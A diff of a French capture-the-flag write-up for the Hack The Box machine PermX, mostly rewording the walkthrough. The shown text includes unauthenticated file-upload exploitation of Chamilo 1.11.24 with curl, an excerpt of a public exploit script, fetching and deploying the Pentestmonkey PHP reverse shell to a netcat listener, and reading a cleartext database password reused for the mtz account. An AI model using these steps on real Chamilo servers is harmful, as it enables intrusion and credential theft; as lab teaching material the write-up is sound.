@@ -492,7 +492,7 @@ Port 80 (http)
 
 ## Prise pied
 
-Les résultats de `mon-nmap` ne révèlent rien d’exploitable au premier coup d’œil : seuls les ports **22 (SSH)** et **80 (HTTP)** sont ouverts, sans indication immédiate de vulnérabilité.
+Les résultats de `mon-nmap` ne révèlent rien d’exploitable au premier coup d’œil : seuls les ports **22 (SSH)** et **80 (HTTP)** sont ouverts, sans vulnérabilité évidente.
 
 En revanche, le script `mon-subdomains` met en évidence le virtual host `lms.permx.htb`.
 
@@ -504,7 +504,8 @@ Tu concentres donc ton analyse sur `lms.permx.htb` et tu lances un `mon-recoweb`
 
 ### Énumération web de lms.permx.htb avec mon-recoweb
 
-Avant toute tentative d’exploitation, tu commences par analyser l’application e-learning via un `mon-recoweb` sur `lms.permx.htb`, ce qui te permet d’obtenir une vue claire de sa structure interne et des fonctionnalités accessibles.
+Une fois `lms.permx.htb` identifié comme cible prioritaire, tu lances un `mon-recoweb` pour explorer l’application en profondeur.
+ L’objectif est de cartographier sa structure et de repérer rapidement les zones potentiellement exploitables.
 
 ```bash
 ===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
@@ -648,11 +649,17 @@ http://lms.permx.htb/whoisonline.php (CODE:200|SIZE:15471)
 http://lms.permx.htb/wp-forum.phps (CODE:403|SIZE:278)
 ```
 
-À la lecture des résultats de `mon-recoweb`, tu observes une application PHP bien structurée, exposant de nombreux répertoires fonctionnels (`/app`, `/main`, `/plugin`, `/vendor`, `/src`) et plusieurs fichiers accessibles directement depuis le web. Ces éléments indiquent un LMS complet, dans lequel l’exploitation va probablement nécessiter une analyse des mécanismes d’authentification et des fonctionnalités internes.
+À la lecture des résultats de `mon-recoweb`, tu observes une application PHP bien structurée, exposant de nombreux répertoires fonctionnels (`/app`, `/main`, `/plugin`, `/vendor`, `/src`) et plusieurs fichiers accessibles directement depuis le web. 
 
-### Identification de la version de Chamilo
+Ces éléments indiquent la présence d’un LMS (Learning Management System), une application web dédiée à la gestion de formations en ligne (cours, utilisateurs, contenus pédagogiques).
 
-Tu poursuis ensuite l’énumération de manière manuelle en explorant l’interface via le navigateur, avec un focus sur `/documentation` et plus particulièrement la page `changelog.html`.
+ Dans ce type d’environnement, l’exploitation passe généralement par l’analyse des mécanismes d’authentification et des fonctionnalités internes exposées par l’application.
+
+### Identification du LMS et de sa version
+
+Après avoir identifié la structure de l’application via `mon-recoweb`, tu poursuis l’analyse dans le navigateur afin de comprendre plus précisément la technologie utilisée.
+
+L’interface accessible sur `lms.permx.htb` correspond à **Chamilo**, un LMS (*Learning Management System*) open source largement utilisé.
 
 
 
@@ -660,11 +667,20 @@ Tu poursuis ensuite l’énumération de manière manuelle en explorant l’inte
 
 
 
+Les résultats de `mon-recoweb` ont révélé un répertoire `/documentation` accessible.
+En y accédant, tu identifies notamment la page `changelog.html`, qui permet de déterminer la version de l’application.
+
+
+
 ![Changelog officiel de Chamilo indiquant la version 1.11.24 utilisée sur la cible](documentation-changelog.png)
 
-En consultant le changelog, tu confirmes que le LMS en place est ***Chamilo 1.11.24 (Beersel)***, ce qui te permet désormais de cibler des vulnérabilités connues associées à cette version.
+Le changelog te montre que la version utilisée est **Chamilo 1.11.24 (Beersel)**.
+
+Cette information est essentielle, car elle permet de cibler précisément des vulnérabilités connues pour Chamilo 1.11.24.
 
 ### Recherche des vulnérabilités
+
+Maintenant que tu as identifié le LMS et sa version (**Chamilo 1.11.24**), tu recherches des vulnérabilités connues à l’aide de `searchsploit`.
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/permx]
@@ -685,7 +701,7 @@ Shellcodes: No Results
 
 ### Analyse de l’exploit Chamilo 1.11.24
 
-Après avoir identifié un exploit public correspondant à la version *Chamilo 1.11.24*, tu le télécharges avec `searchsploit -m` pour comprendre son fonctionnement avant de l’utiliser.
+Tu télécharges l’exploit identifié avec `searchsploit -m` afin d’en comprendre le fonctionnement avant de l’utiliser.
 
 ```bash
 ┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/permx]
@@ -699,9 +715,7 @@ File Type: Python script, ASCII text executable
 Copied to: /mnt/kvm-md0/HTB/permx/52083.py
 ```
 
-Tu commences par examiner le code de l’exploit que tu viens de télécharger, afin de comprendre précisément son fonctionnement et les mécanismes sur lesquels il s’appuie.
-
-
+Tu examines ensuite le code de l’exploit pour identifier précisément le mécanisme exploité.
 
 ```python
 # Exploit Title: Chamilo LMS 1.11.24 - Remote Code Execution (RCE)
@@ -771,13 +785,30 @@ if __name__ == "__main__":
     execute_command(shell_url, args.cmd)
 ```
 
-En analysant l’exploit `52083.py`, tu commences par regarder la fonction `upload_shell`, qui envoie un fichier vers le serveur **Chamilo LMS 1.11.24**. Tu constates que l’application accepte des fichiers via une simple requête HTTP, sans aucune authentification.
+L’analyse du script montre qu’il exploite une vulnérabilité d’**upload de fichier non restreint** dans Chamilo.
+ La fonction `upload_shell` envoie un fichier PHP via une requête HTTP vers l’endpoint :
 
-Le fichier est transmis dans le champ `bigUploadFile`, puis automatiquement enregistré dans le répertoire `/main/inc/lib/javascript/bigupload/files/`. Comme ce dossier est accessible depuis le navigateur, le fichier PHP uploadé peut être appelé directement via HTTP et exécuté par le serveur. Cela permet d’exécuter des commandes sur la machine cible et de valider l’accès initial sous l’utilisateur `www-data`.
+```python
+/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported
+```
 
-Cette analyse montre que l’exploit permet une exécution de commandes à distance sans authentification. Tu le démontres d’abord avec un Proof of Concept simple en exécutant la commande `id`, avant d’utiliser cette primitive pour obtenir un reverse shell et poursuivre l’exploitation.
+Aucune authentification n’est requise, et le fichier est accepté tel quel.
 
-### Proof of Concept — Validation de la RCE avec la commande id
+Une fois uploadé, le fichier est stocké dans le répertoire :
+
+```python
+/main/inc/lib/javascript/bigupload/files/
+```
+
+Ce répertoire étant accessible depuis le web, le fichier PHP peut être exécuté directement et exécuté par le serveur.
+
+Cette vulnérabilité permet une **exécution de commandes à distance (RCE)** sous l’utilisateur `www-data`, sans authentification.
+
+Tu peux donc exécuter des commandes directement sur la machine cible.
+
+Tu commences par réaliser un **Proof of Concept** simple en exécutant la commande `id`, avant d’exploiter cette RCE pour obtenir un reverse shell.
+
+### Proof of Concept — Exécution de la commande `id`
 
 Pour valider concrètement l’exécution de code à distance, tu commences par créer un fichier PHP très simple contenant une seule commande système. L’objectif est uniquement de vérifier si le code PHP est bien exécuté côté serveur.
 
@@ -801,6 +832,8 @@ The file has successfully been uploaded.
 
 Le message *“The file has successfully been uploaded.”* confirme que le serveur accepte l’upload sans authentification et sans filtrage sur l’extension du fichier.
 
+
+
 ![Index du répertoire bigupload montrant le fichier rce.php uploadé et accessible via le web](bigupload-files.png)
 
 Une fois l’upload effectué, tu accèdes directement au fichier PHP via son emplacement dans le répertoire d’upload, accessible depuis le navigateur.
@@ -815,23 +848,22 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 
 
-La réponse renvoyée par le serveur affiche le résultat de la commande `id`, ce qui confirme que le fichier PHP est bien interprété et exécuté côté serveur. La commande s’exécute sous l’utilisateur `www-data`, correspondant au compte du serveur web. Cette sortie valide l’exécution de commandes à distance sans authentification et fournit un point d’appui suffisant pour passer à l’obtention d’un reverse shell.
+La réponse renvoyée par le serveur affiche le résultat de la commande `id`, ce qui confirme que le fichier PHP est bien interprété et exécuté côté serveur. La commande s’exécute sous l’utilisateur `www-data`, correspondant au compte du serveur web. Cette sortie valide l’exécution de commandes à distance sans authentification et fournit une base solide pour passer à l’obtention d’un reverse shell.
 
 
 
 ### Obtention du reverse shell
 
-La RCE étant confirmée, l’étape suivante consiste à obtenir un accès interactif via un reverse shell. Comme **Chamilo** est une application écrite en **PHP**, il est logique d’utiliser un **payload PHP** pour rester dans le même contexte d’exécution.
+Pour obtenir un accès interactif, tu utilises un reverse shell PHP.
+ Un choix classique en CTF est le reverse shell **Pentestmonkey**, simple et éprouvé.
 
-Pour cela, tu choisis le reverse shell **Pentestmonkey**, un payload PHP classique et éprouvé en CTF, disponible  le dépôt officiel GitHub. 
-
-Récupère-le
+Tu le récupères depuis le dépôt officiel :
 
 ```bash
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
 ```
 
-et adapte le début du fichier avec ton adresse IP tun0 et le port d’écoute avant de l’utiliser.
+Avant de l’utiliser, tu modifies le fichier pour y renseigner ton adresse IP (tun0) ainsi que le port d’écoute.
 
 Remplace :
 
@@ -847,25 +879,37 @@ $ip   = '10.10.14.xx';  // ton IP tun0
 $port = 4444;           // ton port d'écoute
 ```
 
-Une fois le payload PHP prêt et adapté avec ton adresse IP et le port d’écoute, tu peux l’uploader de la même manière que lors du Proof of Concept. L’endpoint vulnérable accepte toujours les fichiers envoyés via le champ `bigUploadFile`, ce qui permet d’envoyer le reverse shell PHP sans authentification.
+Une fois le payload adapté, tu l’uploades de la même manière que lors du Proof of Concept.
+
+L’endpoint vulnérable accepte toujours les fichiers envoyés via le champ `bigUploadFile`, ce qui permet d’envoyer le reverse shell sans authentification.
 
 ```bash
 curl -F 'bigUploadFile=@php-reverse-shell.php' 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported'
 ```
 
-Avant de déclencher l’exécution du reverse shell, tu dois mettre en place un **listener** sur ta machine afin de recevoir la connexion entrante depuis la cible. Pour cela, tu ouvres un terminal Kali et tu lances `netcat` en écoute sur le port configuré dans le payload PHP.
+
+
+Avant de déclencher le reverse shell, tu mets en place un **listener** sur ta machine pour recevoir la connexion entrante.
+
+Sur ta machine Kali, lance `netcat` en écoute sur le port défini dans le payload :
 
 ```
 nc -lvnp 4444
 ```
 
-Pour déclencher l’exécution du reverse shell, il suffit d’accéder au fichier PHP uploadé depuis son emplacement dans le répertoire d’upload. Cette action peut se faire directement via le navigateur ou à l’aide d’une requête `curl`, comme ci-dessous :
+
+
+Une fois le listener prêt, il suffit d’exécuter le fichier PHP uploadé pour déclencher la connexion.
+
+Tu peux le faire directement via le navigateur ou avec `curl` :
+
+
 
 ```bash
 curl 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/php-reverse-shell.php'
 ```
 
-Lorsque cette requête est exécutée, le serveur interprète le fichier PHP et initie la connexion inverse vers ta machine.
+Le serveur interprète alors le fichier PHP et initie une connexion vers ta machine.
 
 ```bash
 nc -lvnp 4444             
@@ -881,7 +925,7 @@ www-data
 $
 ```
 
-
+Tu obtiens ainsi un shell en tant que `www-data`, confirmant le succès de l’exploitation.
 
 ### Consolidation du Shell
 
@@ -890,7 +934,7 @@ Une fois le reverse shell obtenu, il est recommandé de le stabiliser afin de tr
 Pour cette phase, tu peux t’appuyer sur la recette dédiée :
  {{< recette "stabiliser-reverse-shell" >}}
 
-Elle décrit un technique classique pour consolider un reverse shell et préparer la suite de l’exploitation dans de bonnes conditions.
+Elle décrit une technique classique pour consolider un reverse shell et préparer la suite de l’exploitation dans de bonnes conditions.
 
 ```bash
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -909,13 +953,9 @@ www-data@permx:/$
 
 ### Identification de l’utilisateur associé au flag user.txt
 
-#### Lister les répertoires utilisateurs
+#### Lister les utilisateurs présents
 
-La toute première chose consiste à regarder **quels comptes utilisateurs existent réellement sur la machine**.
-
-```bash
-ls -l /home
-```
+Tu commences par identifier les comptes utilisateurs présents sur la machine :
 
 ```bash
 ls -l /home
@@ -923,31 +963,41 @@ total 4
 drwxr-x--- 4 mtz mtz 4096 Jun  6  2024 mtz
 ```
 
-#### Chercher directement le flag `user.txt`
+Un seul répertoire utilisateur est présent : `mtz`.
 
-Ensuite, tu vérifies si le flag est déjà présent dans l’un des répertoires listés :
+#### Rechercher le flag `user.txt`
+
+Tu vérifies ensuite si le flag est directement accessible :
 
 ```bash
 find /home -name user.txt 2>/dev/null
 ```
 
-La recherche du flag `user.txt` à l’aide de la commande `find /home -name user.txt` ne renvoie aucun résultat.
- En parallèle, la commande `ls -l /home` ne révèle qu’un seul répertoire utilisateur, appartenant à `mtz`.
- Dans le contexte d’un challenge CTF, cela indique que le flag est très probablement situé dans le répertoire personnel de cet utilisateur, mais qu’il n’est pas accessible avec tes droits actuels. L’objectif devient donc d’obtenir un accès au compte `mtz` afin de pouvoir lire le flag `user.txt`.
+Aucun résultat n’est retourné.
+
+Dans un contexte CTF, cette situation est classique : le flag est généralement stocké dans le répertoire personnel d’un utilisateur.
+
+Ici, la présence unique de `mtz` indique que le fichier `user.txt` se trouve très probablement dans `/home/mtz`, mais qu’il n’est pas accessible avec les droits actuels.
+
+L’objectif devient donc d’obtenir un accès au compte `mtz` afin de pouvoir lire ce fichier.
 
 ### Accès à l’utilisateur mtz via les identifiants Chamilo
 
-Après avoir identifié `mtz` comme l’unique utilisateur du système et propriétaire probable du flag `user.txt`, tu peux exploiter les informations sensibles stockées dans la configuration de l’application Chamilo. L’objectif de cette étape est de récupérer un mot de passe réutilisable afin d’obtenir un accès au compte `mtz`.
+Après avoir identifié `mtz` comme l’unique utilisateur du système et propriétaire probable du flag `user.txt`, tu cherches un moyen d’obtenir ses identifiants.
 
-La documentation officielle de Chamilo, accessible via `http://lms.permx.htb/documentation`, indique que les paramètres de configuration de l’application sont stockés dans le fichier `main/inc/conf/configuration.php`.
+L’application Chamilo constitue ici une piste intéressante, car elle contient des informations sensibles dans ses fichiers de configuration.
 
+La documentation accessible sur `http://lms.permx.htb/documentation` indique que les paramètres de configuration sont stockés dans le fichier :
 
+```bash
+main/inc/conf/configuration.php
+```
 
 ![Documentation Chamilo indiquant l’emplacement du fichier configuration.php contenant les paramètres sensibles](localisation-configuration-php.png)
 
 
 
-En consultant ce fichier, tu identifies les paramètres de connexion à la base de données, notamment l’utilisateur et le mot de passe utilisés par l’application.
+En consultant ce fichier, tu récupères les identifiants de connexion à la base de données :
 
 ```php
 // Database connection settings.
@@ -960,7 +1010,11 @@ $_configuration['db_password'] = '03F6lY3uXAP2bkW8';
 $_configuration['db_manager_enabled'] = false;
 ```
 
-Le mot de passe de la base de données étant disponible en clair, tu testes sa réutilisation pour l’utilisateur `mtz` afin d’obtenir un accès à son compte.
+Le mot de passe est stocké en clair.
+
+Dans un contexte CTF, il est courant que ce type de mot de passe soit réutilisé pour d’autres comptes.
+
+Tu testes donc ce mot de passe avec l’utilisateur `mtz` :
 
 ```bash
 su mtz
@@ -974,11 +1028,15 @@ mtz@permx:/$
 
 
 
-**Tu disposes désormais des identifiants `mtz:03F6lY3uXAP2bkW8`, ce qui te permet d’accéder au compte utilisateur et de poursuivre l’exploitation.**
+L’authentification réussit.
+
+Tu disposes désormais des identifiants `mtz:03F6lY3uXAP2bkW8`, ce qui te permet d’accéder au compte utilisateur et de poursuivre l’exploitation.
 
 ### user.txt
 
-L’accès au compte `mtz` est confirmé. Le flag `user.txt`, présent dans son répertoire personnel, est lisible et permet de valider la récupération du flag utilisateur.
+L’accès au compte `mtz` est confirmé.
+
+Le fichier `user.txt`, présent dans son répertoire personnel, est désormais accessible.
 
 ```bash
 mtz@permx:/$ pwd
@@ -990,7 +1048,7 @@ mtz@permx:/$ cat ~/user.txt
 0a73xxxxxxxxxxxxxxxxxxxxxxxxf725
 ```
 
-
+Après avoir obtenu un accès au compte `mtz` et récupéré le flag utilisateur, l’étape suivante consiste à à identifier une élévation de privilèges vers root.
 
 ---
 
